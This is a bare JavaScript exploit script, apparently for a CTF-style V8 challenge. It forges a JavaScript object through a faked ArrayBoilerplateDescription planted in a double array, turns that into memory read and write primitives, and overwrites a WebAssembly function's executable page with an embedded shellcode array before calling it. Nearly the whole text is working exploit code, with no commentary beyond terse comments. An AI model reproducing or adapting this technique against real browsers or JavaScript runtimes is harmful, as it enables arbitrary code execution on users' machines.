function dp(x){ %DebugPrint(x);}
const print = console.log;
const assert = function (b, msg)
{
	if (!b)
		throw Error(msg);
};
const __buf8 = new ArrayBuffer(8);
const __dvCvt = new DataView(__buf8);
function d2u(val)
{ //double ==> Uint64
	__dvCvt.setFloat64(0, val, true);
}
function u2d(val0, val1)
{ //Uint64 ==> double
	__dvCvt.setUint32(0, val0, true);
	__dvCvt.setUint32(4, val1, true);
	return __dvCvt.getFloat64(0, true);
}
const hex = (x) => ("0x" + x.toString(16));
function getWMain()
{
	const wasmCode = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11]);
	const wasmModule = new WebAssembly.Module(wasmCode);
	const wasmInstance = new WebAssembly.Instance(wasmModule, {});
	return wasmInstance.exports.main;
}
const wmain = getWMain();

const foo = () =>
{
	const x = 0x2019; // signature for Python to find the bytecode of this function
	const arr = [{}, 0x1337];
	return arr[0];
};

const foo2 = () =>
{
	// (0x001C2159 << 32) + 0x001C2159, address of the content of big_array,
	// so we can fake ArrayBoilerplateDescription there
	const arr = [ 3.91199473136590520122441398558E-308,
				  3.91199473136590520122441398558E-308,
				  3.91199473136590520122441398558E-308,
				  3.91199473136590520122441398558E-308,
				  3.91199473136590520122441398558E-308,
				  3.91199473136590520122441398558E-308,
				  3.91199473136590520122441398558E-308,
				  3.91199473136590520122441398558E-308,
				  3.91199473136590520122441398558E-308,
				  3.91199473136590520122441398558E-308,
				  3.91199473136590520122441398558E-308,
				  3.91199473136590520122441398558E-308,
				  3.91199473136590520122441398558E-308,
				  3.91199473136590520122441398558E-308];
	return arr[0];
};

foo2();

const big_array = Array(0x4000);
big_array.fill(1.1);

// ArrayBoilerplateDescription
big_array[1] = u2d(0x000033f5, 0x00000004);
big_array[2] = u2d(0x1C2169, 0);

// FixedArray for constant elements
big_array[3] = u2d(0x00002239, 0x00000004);
big_array[4] = u2d(0x1C2179, 0);

// Faked Object
big_array[5] = u2d(0x001459b1, 0x00002261);
big_array[6] = u2d(0x00002261, 0);

big_array[7] = u2d(0x00143b11, 0x00002261);
big_array[8] = u2d(0x001c0011, 0x00000002);

dp(big_array);

const obj = {a:wmain};
dp(obj);

const fake_obj = foo();
dp(fake_obj);

fake_obj.a = wmain;

d2u(big_array[6]);
const wmain_addr = __dvCvt.getUint32(4, true);
dp(hex(wmain_addr));

big_array[6] = u2d(0x00002261, 0x001C2189);

const arr = [1.1];
dp(arr);

const faker = fake_obj.a;
dp(faker);

d2u(faker[0]);
const base_addr = __dvCvt.getUint32(4, true);

big_array[7] = u2d(0x001431b1, 0x00002261);
big_array[8] = u2d(0x000033e1, 0x000558c5);
big_array[9] = 0;
big_array[10] = u2d(0x00000104, 0x00000000);
big_array[11] = u2d(0x000023e8, 0x00000041);
big_array[12] = u2d(0, wmain_addr - 1 - 0x60);
big_array[13] = u2d(base_addr, 0);
big_array[14] = 0;
big_array[15] = 0;

const rwx_addr0 = faker[0];
const rwx_addr1 = faker[1];

big_array[12] = u2d(0, rwx_addr0);
big_array[13] = u2d(rwx_addr1, 0);

const sc = [1664071752,1818653793,6973281,3884533840,
	1784086634,2303219771,265433574,2425393157,4276879083];

dp(faker);

for (let i = 0; i < sc.length; ++i)
{
	faker[i] = sc[i];
}

wmain();